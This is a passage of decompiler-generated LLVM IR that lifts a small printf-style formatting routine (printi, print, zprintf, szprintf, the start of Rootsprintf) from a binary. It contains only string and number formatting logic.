  %stack_var_-28.37 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_86f0.lr.ph ], [ %v1_870c, %dec_label_pc_86f0 ]
  %v3_86f8 = call i32 @printchar(i32* %v2_86f8, i32 %stack_var_-44.0)
  %v3_86fc = load i32, i32* %stack_var_-48, align 4
  %v1_8700 = add i32 %v3_86fc, 1
  store i32 %v1_8700, i32* %stack_var_-48, align 4
  %v1_870c = add nsw i32 %stack_var_-28.37, -1
  %v5_871c = icmp sgt i32 %stack_var_-28.37, 1
  br i1 %v5_871c, label %dec_label_pc_86f0, label %dec_label_pc_8720

dec_label_pc_8720:                                ; preds = %dec_label_pc_86f0, %dec_label_pc_8714.preheader
  %v3_8720 = phi i32 [ %v3_872026, %dec_label_pc_8714.preheader ], [ %v1_8700, %dec_label_pc_86f0 ]
  store i32 %v3_85b0, i32* @fp, align 4
  ret i32 %v3_8720

; uselistorder directives
  uselistorder i32 %v1_86d4, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_860c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_86f0, { 1, 0 }
  uselistorder label %dec_label_pc_86b0, { 1, 0 }
  uselistorder label %dec_label_pc_867c, { 1, 0 }
  uselistorder label %dec_label_pc_8668, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8650, { 1, 0 }
  uselistorder label %dec_label_pc_85fc, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_8738 = load i32, i32* @fp, align 4
  store i32 34624, i32* %stack_var_-4, align 4
  %v2_873c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_873c, i32* @fp, align 4
  %v1_8770 = icmp slt i32 %arg2, 0
  %v2_8770 = icmp eq i32 %arg2, 0
  br i1 %v2_8770, label %dec_label_pc_8778, label %dec_label_pc_87ac

dec_label_pc_8778:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_879c = bitcast i32* %stack_var_-28 to i8*
  %v6_879c = call i32 @prints(i32 %arg1, i8* %v5_879c, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_890c

dec_label_pc_87ac:                                ; preds = %entry
  %v2_87b0 = icmp eq i32 %arg4, 0
  br i1 %v2_87b0, label %dec_label_pc_87e4, label %dec_label_pc_87b8

dec_label_pc_87b8:                                ; preds = %dec_label_pc_87ac
  %v7_87bc = icmp eq i32 %arg3, 10
  br i1 %v7_87bc, label %dec_label_pc_87c4, label %dec_label_pc_87e4

dec_label_pc_87c4:                                ; preds = %dec_label_pc_87b8
  br i1 %v1_8770, label %dec_label_pc_87d0, label %dec_label_pc_87e4

dec_label_pc_87d0:                                ; preds = %dec_label_pc_87c4
  %v1_87dc = sub i32 0, %arg2
  br label %dec_label_pc_87e4

dec_label_pc_87e4:                                ; preds = %dec_label_pc_87c4, %dec_label_pc_87b8, %dec_label_pc_87ac, %dec_label_pc_87d0
  %stack_var_-52.0 = phi i32 [ %arg2, %dec_label_pc_87ac ], [ %v1_87dc, %dec_label_pc_87d0 ], [ %arg2, %dec_label_pc_87c4 ], [ %arg2, %dec_label_pc_87b8 ]
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_87ac ], [ 1, %dec_label_pc_87d0 ], [ 0, %dec_label_pc_87c4 ], [ 0, %dec_label_pc_87b8 ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_88784 = icmp eq i32 %stack_var_-52.0, 0
  br i1 %v2_88784, label %dec_label_pc_8880, label %dec_label_pc_8800.lr.ph

dec_label_pc_8800.lr.ph:                          ; preds = %dec_label_pc_87e4
  %v1_8828 = add i32 %arg7, -58
  br label %dec_label_pc_8800

dec_label_pc_8800:                                ; preds = %dec_label_pc_8800.lr.ph, %dec_label_pc_8838
  %stack_var_-52.16 = phi i32 [ %stack_var_-52.0, %dec_label_pc_8800.lr.ph ], [ %v2_880c, %dec_label_pc_8838 ]
  %stack_var_-68.05 = phi i8* [ %tmp26, %dec_label_pc_8800.lr.ph ], [ %v5_8840, %dec_label_pc_8838 ]
  %v2_880c = udiv i32 %stack_var_-52.16, %arg3
  %v3_880c = urem i32 %stack_var_-52.16, %arg3
  %v7_8820 = icmp slt i32 %v3_880c, 10
  br i1 %v7_8820, label %dec_label_pc_8838, label %dec_label_pc_8824

dec_label_pc_8824:                                ; preds = %dec_label_pc_8800
  %v2_8830 = add i32 %v3_880c, %v1_8828
  br label %dec_label_pc_8838

dec_label_pc_8838:                                ; preds = %dec_label_pc_8800, %dec_label_pc_8824
  %stack_var_-64.0 = phi i32 [ %v3_880c, %dec_label_pc_8800 ], [ %v2_8830, %dec_label_pc_8824 ]
  %v4_8838 = ptrtoint i8* %stack_var_-68.05 to i32
  %v1_883c = add i32 %v4_8838, -1
  %v5_8840 = inttoptr i32 %v1_883c to i8*
  %fold = add i32 %stack_var_-64.0, 48
  %v1_8858 = trunc i32 %fold to i8
  store i8 %v1_8858, i8* %v5_8840, align 1
  %v2_8878 = icmp ult i32 %stack_var_-52.16, %arg3
  br i1 %v2_8878, label %dec_label_pc_8880, label %dec_label_pc_8800

dec_label_pc_8880:                                ; preds = %dec_label_pc_8838, %dec_label_pc_87e4
  %stack_var_-68.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_87e4 ], [ %v5_8840, %dec_label_pc_8838 ]
  %v2_8884 = icmp eq i32 %stack_var_-60.0, 0
  br i1 %v2_8884, label %dec_label_pc_88e8, label %dec_label_pc_888c

dec_label_pc_888c:                                ; preds = %dec_label_pc_8880
  %v3_888c = load i32, i32* %stack_var_0, align 4
  %v2_8890 = icmp eq i32 %v3_888c, 0
  br i1 %v2_8890, label %dec_label_pc_88d0, label %dec_label_pc_8898

dec_label_pc_8898:                                ; preds = %dec_label_pc_888c
  %v1_889c = and i32 %arg6, 2
  %v2_88a0 = icmp eq i32 %v1_889c, 0
  br i1 %v2_88a0, label %dec_label_pc_88d0, label %dec_label_pc_88a8

dec_label_pc_88a8:                                ; preds = %dec_label_pc_8898
  %v2_88b0 = inttoptr i32 %arg1 to i32*
  %v3_88b0 = call i32 @printchar(i32* %v2_88b0, i32 45)
  %v3_88c0 = load i32, i32* %stack_var_0, align 4
  %v1_88c4 = add i32 %v3_88c0, -1
  store i32 %v1_88c4, i32* %stack_var_0, align 4
  br label %dec_label_pc_88e8

dec_label_pc_88d0:                                ; preds = %dec_label_pc_8898, %dec_label_pc_888c
  %v4_88d0 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_88d4 = add i32 %v4_88d0, -1
  %v5_88d8 = inttoptr i32 %v1_88d4 to i8*
  store i8 45, i8* %v5_88d8, align 1
  br label %dec_label_pc_88e8

dec_label_pc_88e8:                                ; preds = %dec_label_pc_8880, %dec_label_pc_88a8, %dec_label_pc_88d0
  %stack_var_-68.1 = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_8880 ], [ %v5_88d8, %dec_label_pc_88d0 ], [ %stack_var_-68.0.lcssa, %dec_label_pc_88a8 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8880 ], [ 0, %dec_label_pc_88d0 ], [ 1, %dec_label_pc_88a8 ]
  %v3_88f0 = load i32, i32* %stack_var_0, align 4
  %v6_88f8 = call i32 @prints(i32 %arg1, i8* %stack_var_-68.1, i32 %v3_88f0, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_8904 = add i32 %v6_88f8, %stack_var_-56.0
  br label %dec_label_pc_890c

dec_label_pc_890c:                                ; preds = %dec_label_pc_8778, %dec_label_pc_88e8
  %storemerge2 = phi i32 [ %v2_8904, %dec_label_pc_88e8 ], [ %v6_879c, %dec_label_pc_8778 ]
  store i32 %v3_8738, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-68.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_8840, { 0, 2, 1 }
  uselistorder i32 %v3_880c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_890c, { 1, 0 }
  uselistorder label %dec_label_pc_88e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8838, { 1, 0 }
  uselistorder label %dec_label_pc_8800, { 1, 0 }
  uselistorder label %dec_label_pc_87e4, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 35116, i32* %stack_var_-4, align 4
  %v2_8928 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8928, i32* @fp, align 4
  %stack_var_-32.428 = inttoptr i32 %arg2 to i8*
  %v2_8cd429 = load i8, i8* %stack_var_-32.428, align 1
  %v2_8cd831 = icmp eq i8 %v2_8cd429, 0
  br i1 %v2_8cd831, label %dec_label_pc_8ce0, label %dec_label_pc_8948.lr.ph

dec_label_pc_8948.lr.ph:                          ; preds = %entry
  %v5_8c8c = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8948

dec_label_pc_8948:                                ; preds = %dec_label_pc_8948.lr.ph, %dec_label_pc_8cc4
  %stack_var_-32.435 = phi i8* [ %stack_var_-32.428, %dec_label_pc_8948.lr.ph ], [ %stack_var_-32.4, %dec_label_pc_8cc4 ]
  %stack_var_-32.4.in34 = phi i32 [ %arg2, %dec_label_pc_8948.lr.ph ], [ %v1_8cc8, %dec_label_pc_8cc4 ]
  %stack_var_-36.133 = phi i32 [ %arg3, %dec_label_pc_8948.lr.ph ], [ %stack_var_-36.0, %dec_label_pc_8cc4 ]
  %stack_var_-44.132 = phi i32 [ 0, %dec_label_pc_8948.lr.ph ], [ %stack_var_-44.0, %dec_label_pc_8cc4 ]
  %v2_894c = load i8, i8* %stack_var_-32.435, align 1
  %v7_8950 = icmp eq i8 %v2_894c, 37
  br i1 %v7_8950, label %dec_label_pc_8958, label %dec_label_pc_8ca4

dec_label_pc_8958:                                ; preds = %dec_label_pc_8948
  %v1_895c = add i32 %stack_var_-32.4.in34, 1
  %v5_8960 = inttoptr i32 %v1_895c to i8*
  %v2_8978 = load i8, i8* %v5_8960, align 1
  %v2_897c = icmp eq i8 %v2_8978, 0
  br i1 %v2_897c, label %dec_label_pc_8ce0, label %dec_label_pc_8984

dec_label_pc_8984:                                ; preds = %dec_label_pc_8958
  %v2_8988 = load i8, i8* %v5_8960, align 1
  %v7_898c = icmp eq i8 %v2_8988, 37
  br i1 %v7_898c, label %dec_label_pc_8ca4, label %dec_label_pc_8994

dec_label_pc_8994:                                ; preds = %dec_label_pc_8984
  %v2_8998 = load i8, i8* %v5_8960, align 1
  %v7_899c = icmp eq i8 %v2_8998, 45
  br i1 %v7_899c, label %dec_label_pc_89a4, label %dec_label_pc_89d4.preheader

dec_label_pc_89a4:                                ; preds = %dec_label_pc_8994
  %v1_89a8 = add i32 %stack_var_-32.4.in34, 2
  %v5_89ac = inttoptr i32 %v1_89a8 to i8*
  br label %dec_label_pc_89d4.preheader

dec_label_pc_89d4.preheader:                      ; preds = %dec_label_pc_89a4, %dec_label_pc_8994
  %stack_var_-32.0.ph = phi i8* [ %v5_8960, %dec_label_pc_8994 ], [ %v5_89ac, %dec_label_pc_89a4 ]
  %stack_var_-48.0.ph = phi i32 [ 0, %dec_label_pc_8994 ], [ 1, %dec_label_pc_89a4 ]
  %v4_89d42 = ptrtoint i8* %stack_var_-32.0.ph to i32
  %v2_89d83 = load i8, i8* %stack_var_-32.0.ph, align 1
  %v7_89dc7 = icmp eq i8 %v2_89d83, 48
  br i1 %v7_89dc7, label %dec_label_pc_89bc, label %dec_label_pc_8a20.preheader

dec_label_pc_89bc:                                ; preds = %dec_label_pc_89d4.preheader, %dec_label_pc_89bc
  %v4_89d49 = phi i32 [ %v1_89c0, %dec_label_pc_89bc ], [ %v4_89d42, %dec_label_pc_89d4.preheader ]
  %stack_var_-48.08 = phi i32 [ %v1_89cc, %dec_label_pc_89bc ], [ %stack_var_-48.0.ph, %dec_label_pc_89d4.preheader ]
  %v1_89c0 = add i32 %v4_89d49, 1
  %v5_89c4 = inttoptr i32 %v1_89c0 to i8*
  %v1_89cc = or i32 %stack_var_-48.08, 2
  %v2_89d8 = load i8, i8* %v5_89c4, align 1
  %v7_89dc = icmp eq i8 %v2_89d8, 48
  br i1 %v7_89dc, label %dec_label_pc_89bc, label %dec_label_pc_8a20.preheader

dec_label_pc_8a20.preheader:                      ; preds = %dec_label_pc_89bc, %dec_label_pc_89d4.preheader
  %stack_var_-48.0.lcssa = phi i32 [ %stack_var_-48.0.ph, %dec_label_pc_89d4.preheader ], [ %v1_89cc, %dec_label_pc_89bc ]
  %stack_var_-32.0.lcssa = phi i8* [ %stack_var_-32.0.ph, %dec_label_pc_89d4.preheader ], [ %v5_89c4, %dec_label_pc_89bc ]
  %v4_8a2011 = ptrtoint i8* %stack_var_-32.0.lcssa to i32
  %v2_8a2412 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_8a2412, 48
  br i1 %tmp60, label %dec_label_pc_8a40, label %dec_label_pc_8a30

dec_label_pc_89e8:                                ; preds = %dec_label_pc_8a30
  %v2_89f4 = mul i32 %stack_var_-52.019, 10
  %v2_8a00 = load i8, i8* %stack_var_-32.120, align 1
  %v3_8a00 = zext i8 %v2_8a00 to i32
  %v1_8a04 = add i32 %v2_89f4, -48
  %v2_8a0c = add i32 %v1_8a04, %v3_8a00
  %v1_8a18 = add i32 %v4_8a2021, 1
  %v5_8a1c = inttoptr i32 %v1_8a18 to i8*
  %v2_8a24 = load i8, i8* %v5_8a1c, align 1
  %tmp61 = icmp ult i8 %v2_8a24, 48
  br i1 %tmp61, label %dec_label_pc_8a40, label %dec_label_pc_8a30

dec_label_pc_8a30:                                ; preds = %dec_label_pc_8a20.preheader, %dec_label_pc_89e8
  %v4_8a2021 = phi i32 [ %v1_8a18, %dec_label_pc_89e8 ], [ %v4_8a2011, %dec_label_pc_8a20.preheader ]
  %stack_var_-32.120 = phi i8* [ %v5_8a1c, %dec_label_pc_89e8 ], [ %stack_var_-32.0.lcssa, %dec_label_pc_8a20.preheader ]
  %stack_var_-52.019 = phi i32 [ %v2_8a0c, %dec_label_pc_89e8 ], [ 0, %dec_label_pc_8a20.preheader ]
  %v2_8a34 = load i8, i8* %stack_var_-32.120, align 1
  %tmp62 = icmp ult i8 %v2_8a34, 58
  br i1 %tmp62, label %dec_label_pc_89e8, label %dec_label_pc_8a40

dec_label_pc_8a40:                                ; preds = %dec_label_pc_89e8, %dec_label_pc_8a30, %dec_label_pc_8a20.preheader
  %stack_var_-52.0.lcssa = phi i32 [ 0, %dec_label_pc_8a20.preheader ], [ %v2_8a0c, %dec_label_pc_89e8 ], [ %stack_var_-52.019, %dec_label_pc_8a30 ]
  %stack_var_-32.1.lcssa = phi i8* [ %stack_var_-32.0.lcssa, %dec_label_pc_8a20.preheader ], [ %v5_8a1c, %dec_label_pc_89e8 ], [ %stack_var_-32.120, %dec_label_pc_8a30 ]
  %v2_8a44 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8a48 = icmp eq i8 %v2_8a44, 115
  br i1 %v7_8a48, label %dec_label_pc_8a50, label %dec_label_pc_8ab4

dec_label_pc_8a50:                                ; preds = %dec_label_pc_8a40
  %v1_8a54 = add i32 %stack_var_-36.133, 4
  %v1_8a60 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8a60 = load i32, i32* %v1_8a60, align 4
  %v2_8a6c = icmp eq i32 %v2_8a60, 0
  br i1 %v2_8a6c, label %dec_label_pc_8a80, label %dec_label_pc_8a74

dec_label_pc_8a74:                                ; preds = %dec_label_pc_8a50
  %v5_8a78 = inttoptr i32 %v2_8a60 to i8*
  br label %dec_label_pc_8a88

dec_label_pc_8a80:                                ; preds = %dec_label_pc_8a50
  br label %dec_label_pc_8a88

dec_label_pc_8a88:                                ; preds = %dec_label_pc_8a74, %dec_label_pc_8a80
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c790.31, i32 0, i32 0), %dec_label_pc_8a80 ], [ %v5_8a78, %dec_label_pc_8a74 ]
  %v7_8a9c = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8aa8 = add i32 %v7_8a9c, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8ab4:                                ; preds = %dec_label_pc_8a40
  %v2_8ab8 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8abc = icmp eq i8 %v2_8ab8, 100
  br i1 %v7_8abc, label %dec_label_pc_8ac4, label %dec_label_pc_8b18

dec_label_pc_8ac4:                                ; preds = %dec_label_pc_8ab4
  %v1_8ac8 = add i32 %stack_var_-36.133, 4
  %v1_8ad4 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8ad4 = load i32, i32* %v1_8ad4, align 4
  %v7_8b00 = call i32 @printi(i32 %tmp, i32 %v2_8ad4, i32 10, i32 1, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8b0c = add i32 %v7_8b00, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8b18:                                ; preds = %dec_label_pc_8ab4
  %v2_8b1c = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8b20 = icmp eq i8 %v2_8b1c, 120
  br i1 %v7_8b20, label %dec_label_pc_8b28, label %dec_label_pc_8b7c

dec_label_pc_8b28:                                ; preds = %dec_label_pc_8b18
  %v1_8b2c = add i32 %stack_var_-36.133, 4
  %v1_8b38 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8b38 = load i32, i32* %v1_8b38, align 4
  %v7_8b64 = call i32 @printi(i32 %tmp, i32 %v2_8b38, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8b70 = add i32 %v7_8b64, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8b7c:                                ; preds = %dec_label_pc_8b18
  %v2_8b80 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8b84 = icmp eq i8 %v2_8b80, 88
  br i1 %v7_8b84, label %dec_label_pc_8b8c, label %dec_label_pc_8be0

dec_label_pc_8b8c:                                ; preds = %dec_label_pc_8b7c
  %v1_8b90 = add i32 %stack_var_-36.133, 4
  %v1_8b9c = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8b9c = load i32, i32* %v1_8b9c, align 4
  %v7_8bc8 = call i32 @printi(i32 %tmp, i32 %v2_8b9c, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 65)
  %v2_8bd4 = add i32 %v7_8bc8, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8be0:                                ; preds = %dec_label_pc_8b7c
  %v2_8be4 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8be8 = icmp eq i8 %v2_8be4, 117
  br i1 %v7_8be8, label %dec_label_pc_8bf0, label %dec_label_pc_8c44

dec_label_pc_8bf0:                                ; preds = %dec_label_pc_8be0
  %v1_8bf4 = add i32 %stack_var_-36.133, 4
  %v1_8c00 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8c00 = load i32, i32* %v1_8c00, align 4
  %v7_8c2c = call i32 @printi(i32 %tmp, i32 %v2_8c00, i32 10, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8c38 = add i32 %v7_8c2c, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8c44:                                ; preds = %dec_label_pc_8be0
  %v2_8c48 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8c4c = icmp eq i8 %v2_8c48, 99
  br i1 %v7_8c4c, label %dec_label_pc_8c54, label %dec_label_pc_8cc4

dec_label_pc_8c54:                                ; preds = %dec_label_pc_8c44
  %v1_8c58 = add i32 %stack_var_-36.133, 4
  %v1_8c64 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8c64 = load i32, i32* %v1_8c64, align 4
  %v1_8c68 = urem i32 %v2_8c64, 256
  store i32 %v1_8c68, i32* %stack_var_-18, align 4
  %v6_8c8c = call i32 @prints(i32 %tmp, i8* %v5_8c8c, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 %v1_8c58)
  %v2_8c98 = add i32 %v6_8c8c, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8ca4:                                ; preds = %dec_label_pc_8948, %dec_label_pc_8984
  %stack_var_-32.2 = phi i8* [ %v5_8960, %dec_label_pc_8984 ], [ %stack_var_-32.435, %dec_label_pc_8948 ]
  %v2_8ca8 = load i8, i8* %stack_var_-32.2, align 1
  %v3_8ca8 = zext i8 %v2_8ca8 to i32
  %v3_8cb4 = call i32 @printchar(i32* %arg1, i32 %v3_8ca8)
  %v1_8cbc = add i32 %stack_var_-44.132, 1
  br label %dec_label_pc_8cc4

dec_label_pc_8cc4:                                ; preds = %dec_label_pc_8c44, %dec_label_pc_8c54, %dec_label_pc_8bf0, %dec_label_pc_8b8c, %dec_label_pc_8b28, %dec_label_pc_8a88, %dec_label_pc_8ac4, %dec_label_pc_8ca4
  %stack_var_-44.0 = phi i32 [ %v1_8cbc, %dec_label_pc_8ca4 ], [ %v2_8aa8, %dec_label_pc_8a88 ], [ %v2_8b0c, %dec_label_pc_8ac4 ], [ %v2_8b70, %dec_label_pc_8b28 ], [ %v2_8bd4, %dec_label_pc_8b8c ], [ %v2_8c38, %dec_label_pc_8bf0 ], [ %v2_8c98, %dec_label_pc_8c54 ], [ %stack_var_-44.132, %dec_label_pc_8c44 ]
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.133, %dec_label_pc_8ca4 ], [ %v1_8a54, %dec_label_pc_8a88 ], [ %v1_8ac8, %dec_label_pc_8ac4 ], [ %v1_8b2c, %dec_label_pc_8b28 ], [ %v1_8b90, %dec_label_pc_8b8c ], [ %v1_8bf4, %dec_label_pc_8bf0 ], [ %v1_8c58, %dec_label_pc_8c54 ], [ %stack_var_-36.133, %dec_label_pc_8c44 ]
  %stack_var_-32.3 = phi i8* [ %stack_var_-32.2, %dec_label_pc_8ca4 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8a88 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8ac4 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8b28 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8b8c ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8bf0 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c54 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c44 ]
  %v4_8cc4 = ptrtoint i8* %stack_var_-32.3 to i32
  %v1_8cc8 = add i32 %v4_8cc4, 1
  %stack_var_-32.4 = inttoptr i32 %v1_8cc8 to i8*
  %v2_8cd4 = load i8, i8* %stack_var_-32.4, align 1
  %v2_8cd8 = icmp eq i8 %v2_8cd4, 0
  br i1 %v2_8cd8, label %dec_label_pc_8ce0, label %dec_label_pc_8948

dec_label_pc_8ce0:                                ; preds = %dec_label_pc_8958, %dec_label_pc_8cc4, %entry
  %stack_var_-44.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-44.132, %dec_label_pc_8958 ], [ %stack_var_-44.0, %dec_label_pc_8cc4 ]
  %v2_8ce4 = icmp eq i32* %arg1, null
  br i1 %v2_8ce4, label %dec_label_pc_8cfc, label %dec_label_pc_8cec

dec_label_pc_8cec:                                ; preds = %dec_label_pc_8ce0
  %v2_8cf0 = load i32, i32* %arg1, align 4
  %v3_8cf8 = inttoptr i32 %v2_8cf0 to i8*
  store i8 0, i8* %v3_8cf8, align 1
  br label %dec_label_pc_8cfc

dec_label_pc_8cfc:                                ; preds = %dec_label_pc_8ce0, %dec_label_pc_8cec
  ret i32 %stack_var_-44.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-32.4, { 1, 0 }
  uselistorder i8* %stack_var_-32.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-32.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_89c0, { 1, 0 }
  uselistorder i32 %stack_var_-48.0.ph, { 1, 0 }
  uselistorder i8* %v5_8960, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-44.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-36.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-32.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32*, i32)* @printchar, { 0, 4, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8cfc, { 1, 0 }
  uselistorder label %dec_label_pc_8ce0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8cc4, { 7, 1, 0, 2, 3, 4, 6, 5 }
  uselistorder label %dec_label_pc_8ca4, { 1, 0 }
  uselistorder label %dec_label_pc_8a88, { 1, 0 }
  uselistorder label %dec_label_pc_8a40, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8a30, { 1, 0 }
  uselistorder label %dec_label_pc_89bc, { 1, 0 }
  uselistorder label %dec_label_pc_8948, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v6_8d18 = load i32, i32* @r1, align 4
  store i32 %v6_8d18, i32* %stack_var_-12, align 4
  %v3_8d1c = load i32, i32* @fp, align 4
  store i32 36132, i32* %stack_var_-20, align 4
  %v2_8d20 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8d20, i32* @fp, align 4
  %v4_8d2c = ptrtoint i32* %stack_var_-12 to i32
  %v4_8d40 = call i32 @print(i32* null, i32 %arg1, i32 %v4_8d2c)
  store i32 %v3_8d1c, i32* @fp, align 4
  ret i32 %v4_8d40

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8d60 = load i32, i32* @fp, align 4
  store i32 36200, i32* %stack_var_-16, align 4
  %v2_8d64 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d64, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-44, align 4
  %v2_8d70 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8d88 = call i32 @print(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_8d70)
  store i32 %v3_8d60, i32* @fp, align 4
  ret i32 %v4_8d88

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @Rootsprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_8da4 = load i32, i32* @r2, align 4
  store i32 %v6_8da4, i32* %stack_var_-8, align 4
  %v3_8da8 = load i32, i32* @fp, align 4
  store i32 36272, i32* %stack_var_-16, align 4
  %v2_8dac = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8dac, i32* @fp, align 4
  %v1_8dbc = call i32 @malloc(i32 2048)
  store i32 %v1_8dbc, i32* %stack_var_-44, align 4
  store i32 2048, i32* @r2, align 4
  %v2_8dd8 = inttoptr i32 %v1_8dbc to i8*
  %v3_8dd8 = call i32 @__GI_memset(i8* %v2_8dd8, i32 0)
  %v2_8de4 = ptrtoint i32* %stack_var_-8 to i32
